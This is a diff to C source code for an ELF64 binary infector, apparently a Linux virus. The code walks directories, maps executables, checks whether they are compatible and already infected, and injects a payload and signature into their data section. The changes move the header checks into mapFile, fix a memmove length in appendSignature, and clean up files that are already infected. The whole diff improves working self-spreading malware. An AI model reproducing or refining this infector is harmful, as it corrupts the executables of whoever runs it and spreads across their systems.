@@ -455,6 +455,12 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     close(fd);
     return (-1);
   }
+  if (stats.st_size < sizeof(Elf64_Ehdr) ||
+    !isCompatible(((Elf64_Ehdr *)tmp)->e_ident, ((Elf64_Ehdr *)tmp)->e_machine)) {
+    munmap(tmp, stats.st_size);
+    close(fd);
+    return (1);
+  }
   data = getDataSectionHeader((void *)tmp);
   len = strlen(payload) + sizeof(size_t) + 1;
   if (len != (len & -16))
@@ -517,7 +523,7 @@ static void  appendSignature(struct bfile file, size_t offset) {
   char payload[] = PAYLOAD;
   toAdd = strlen(payload) + 1 + sizeof(size_t);
   aligned = toAdd != (toAdd & -16) ? (toAdd & -16) + 16 : toAdd;
-  memmove(((void *)file.header) + offset + aligned, ((void *)file.header) + offset, file.size - offset);
+  memmove(((void *)file.header) + offset + aligned, ((void *)file.header) + offset, file.size - offset - aligned);
   memcpy(((void *)file.header) + offset, payload, strlen(payload));
   memcpy(((void *)file.header) + offset + strlen(payload), (void *)dynamicSignature + 4, sizeof(size_t));
   memset(((void *)file.header) + offset + strlen(payload) + sizeof(size_t), 0, aligned - toAdd);
@@ -716,12 +722,14 @@ static int  infectBins(const char *dirname) {
     dirp = (struct linux_dirent64 *) (buf + bpos);
     if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
       return (-1);
-    if (ret == 0 &&
-      bin.size >= sizeof(Elf64_Ehdr) &&
-      isCompatible(bin.header->e_ident, bin.header->e_machine) &&
-      !isInfected(bin))
-      if (infectFile(bin) == -1)
-        return (-1);
+    if (ret == 0) {
+      if (isInfected(bin)) {
+        close(bin.fd);
+        munmap(bin.header, bin.size);
+      } else
+        if (infectFile(bin) == -1)
+          return (-1);
+    }
     bpos += dirp->d_reclen;
   }
   close(fd);
